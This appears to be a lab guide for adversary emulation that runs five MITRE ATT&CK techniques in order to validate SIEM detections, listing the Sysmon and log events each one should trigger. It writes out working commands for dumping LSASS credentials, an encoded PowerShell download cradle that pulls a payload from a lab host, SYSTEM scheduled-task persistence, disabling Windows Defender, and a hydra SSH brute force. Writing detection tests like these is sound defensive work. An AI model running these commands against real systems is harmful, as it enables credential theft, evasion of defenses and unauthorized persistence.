# Part 2: Adversary Emulation & MITRE ATT&CK Execution

To validate SIEM detection logic, we simulate attacks using both the **Atomic Red Team** framework (Red Canary) and manual attacker commands. This mirrors real-world threat actor behaviors documented in corporate breaches.

---

## ⚠️ Lab Disclaimer
All commands documented below must be executed **strictly within an isolated laboratory environment**. Do not execute these tests on production corporate networks.

---

## Technique 1: Credential Dumping via LSASS Memory (T1003.001)

### Objective
Adversaries dump credentials from the Local Security Authority Subsystem Service (`lsass.exe`) process memory to extract plaintext passwords and NTLM hashes.

### Attack Procedures Executed:
#### Method A: Native Living-off-the-Land (LotL) using `comsvcs.dll`
On the target Windows machine (run as Administrator):
```powershell
# Locate LSASS PID
$LsassPid = (Get-Process lsass).Id

# Execute memory dump via native signed Windows DLL
rundll32.exe C:\Windows\System32\comsvcs.dll, MiniDump $LsassPid C:\Windows\Temp\lsass_dump.dmp full
```

#### Method B: Sysinternals ProcDump (Abuse of signed administration utility)
```cmd
procdump.exe -ma lsass.exe C:\Windows\Temp\lsass.dmp
```

### Expected Telemetry Generated:
* **Sysmon Event ID 10 (ProcessAccess):** Source process `rundll32.exe` requesting target process `lsass.exe` with granted access mask `0x1FFFFF` or `0x1010` (Query/Read access).
* **Sysmon Event ID 11 (FileCreate):** Creation of `.dmp` file inside `C:\Windows\Temp\`.

---

## Technique 2: Obfuscated PowerShell Download Cradle (T1059.001)

### Objective
Adversaries use encoded commands and in-memory download cradles to bypass perimeter URL filters and initial command-line inspections.

### Attack Procedure:
```powershell
# Create an encoded payload downloading a simulated remote script
$RawCommand = "Invoke-WebRequest -Uri 'http://192.168.56.20/payload.ps1' -OutFile 'C:\Users\Public\payload.exe'"
$Bytes = [System.Text.Encoding]::Unicode.GetBytes($RawCommand)
$EncodedCommand = [Convert]::ToBase64String($Bytes)

# Execute via powershell.exe with evasion flags
powershell.exe -NoP -NonI -W Hidden -Enc $EncodedCommand
```

### Expected Telemetry Generated:
* **Sysmon Event ID 1 (Process Creation):** `powershell.exe` executed with command-line flag `-Enc` / `-EncodedCommand`.
* **PowerShell Script Block Logging (Event ID 4104):** De-obfuscated script block captured in plain text: `Invoke-WebRequest -Uri 'http://192.168.56.20/payload.ps1'`.

---

## Technique 3: Persistence via Scheduled Task (T1053.005)

### Objective
Establish persistence across reboots by scheduling a recurring task under system or administrator context.

### Attack Procedure:
```cmd
schtasks.exe /create /tn "EnterpriseSecurityUpdate" /tr "powershell.exe -WindowStyle Hidden -File C:\Users\Public\update.ps1" /sc onlogon /ru "SYSTEM"
```

### Expected Telemetry Generated:
* **Sysmon Event ID 1 (Process Creation):** `schtasks.exe` executed with `/create` parameter.
* **Windows Security Log Event 4698:** A scheduled task was created.
* Task XML definition containing the target binary stored in `C:\Windows\System32\Tasks\`.

---

## Technique 4: Impairing Defenses - Disabling Windows Defender (T1562.001)

### Objective
Disable endpoint antivirus protection prior to dropping secondary payloads.

### Attack Procedure:
```powershell
# Disable Real-time monitoring and cloud protection
Set-MpPreference -DisableRealtimeMonitoring $true
Set-MpPreference -DisableBehaviorMonitoring $true
Set-MpPreference -DisableIOAVProtection $true
```

### Expected Telemetry Generated:
* **Sysmon Event ID 13 (RegistryValue Modification):**
  * Target Object: `HKLM\SOFTWARE\Microsoft\Windows Defender\Real-Time Protection\DisableRealtimeMonitoring`
  * New Value: `1` (DWORD).
* **Windows Defender Operational Log (Event ID 5001):** Real-time protection was disabled.

---

## Technique 5: Linux SSH Brute Force (T1110.001)

### Objective
Simulate external credential stuffing / brute force against an exposed SSH port on the Linux server.

### Attack Procedure (From Kali Linux `192.168.56.20`):
```bash
# Generate wordlist and simulate brute force against target
hydra -l root -P /usr/share/wordlists/metasploit/unix_passwords.txt ssh://192.168.56.15 -t 4 -V
```

### Expected Telemetry Generated:
* **Linux `/var/log/auth.log`:** Repeated rapid log entries showing:
  `Failed password for root from 192.168.56.20 port ... ssh2`
* High frequency of authentication failures triggering threshold-based correlation rules.
